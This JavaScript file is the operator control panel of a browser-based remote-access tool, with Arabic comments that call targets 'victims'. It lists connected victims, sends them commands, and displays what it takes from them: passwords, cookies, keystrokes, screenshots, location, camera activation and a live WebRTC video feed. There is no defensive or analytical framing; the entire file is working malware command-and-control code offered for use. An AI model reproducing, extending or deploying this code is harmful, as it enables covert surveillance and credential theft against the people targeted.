const socket = io({
    transports: ['websocket', 'polling'],
    reconnection: true
});

let selectedVictimId = null;
let peerConnection = null;
let stolenDataLog = [];

// 🔴 التحقق من المطور
function authenticateAdmin() {
    const key = document.getElementById('admin-key').value;
    socket.emit('admin_register', { key: key });
}

socket.on('admin_authenticated', (response) => {
    if (response.status === 'success') {
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('main-panel').style.display = 'block';
        console.log('👑 تم تسجيل الدخول بنجاح');
    } else {
        alert('مفتاح خاطئ!');
    }
});

// 🔴 تحديث قائمة الضحايا
socket.on('victims_update', (victims) => {
    document.getElementById('victim-count').textContent = victims.length;
    const container = document.getElementById('victims-container');
    container.innerHTML = '';
    
    victims.forEach(victim => {
        const card = document.createElement('div');
        card.className = 'victim-card';
        card.innerHTML = `
            <div class="victim-header">
                <span class="status-dot"></span>
                <strong>${victim.deviceName}</strong>
            </div>
            <div class="victim-info">
                <p>IP: ${victim.ip}</p>
                <p>Browser: ${victim.browser}</p>
                <p>Screen: ${victim.screenRes}</p>
                <p>Connected: ${new Date(victim.connectedAt).toLocaleString()}</p>
            </div>
        `;
        card.onclick = () => selectVictim(victim.id, card);
        container.appendChild(card);
    });
});

// 🔴 اختيار ضحية
function selectVictim(victimId, cardElement) {
    selectedVictimId = victimId;
    document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('selected'));
    cardElement.classList.add('selected');
}

// 🔴 إرسال الأوامر
function sendCommand(action, params = {}) {
    if (!selectedVictimId) {
        alert('اختر ضحية أولاً');
        return;
    }
    
    socket.emit('admin_command', {
        victimId: selectedVictimId,
        action: action,
        params: params
    });
}

// 🔴 استقبال البيانات المسروقة
socket.on('victim_response', (data) => {
    const dataContainer = document.getElementById('stolen-data');
    const logEntry = document.createElement('div');
    logEntry.className = 'data-entry';
    
    let displayData = '';
    switch(data.type) {
        case 'credentials':
            displayData = `🔑 بيانات تسجيل: ${data.data.email} : ${data.data.password}`;
            break;
        case 'camera_activated':
            displayData = `📷 تم تفعيل الكاميرا`;
            break;
        case 'screenshot':
            displayData = `<img src="${data.data}" class="screenshot-img">`;
            break;
        case 'location':
            displayData = `📍 موقع: ${data.data.lat}, ${data.data.lng}`;
            break;
        case 'cookies':
            displayData = `🍪 كوكيز: ${data.data}`;
            break;
        case 'keylog':
            displayData = `⌨️ ضغطات: ${JSON.stringify(data.data)}`;
            break;
        default:
            displayData = JSON.stringify(data.data);
    }
    
    logEntry.innerHTML = `
        <div class="data-time">${new Date(data.timestamp).toLocaleTimeString()}</div>
        <div class="data-content">${displayData}</div>
    `;
    dataContainer.prepend(logEntry);
});

// 🔴 WebRTC للبث المباشر
socket.on('webrtc_offer', async (data) => {
    const configuration = {
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    };
    
    peerConnection = new RTCPeerConnection(configuration);
    peerConnection.ontrack = (event) => {
        document.getElementById('remoteVideo').srcObject = event.streams[0];
    };
    
    await peerConnection.setRemoteDescription(data.offer);
    const answer = await peerConnection.createAnswer();
    await peerConnection.setLocalDescription(answer);
    socket.emit('webrtc_answer', {
        targetId: data.from,
        answer: answer
    });
});
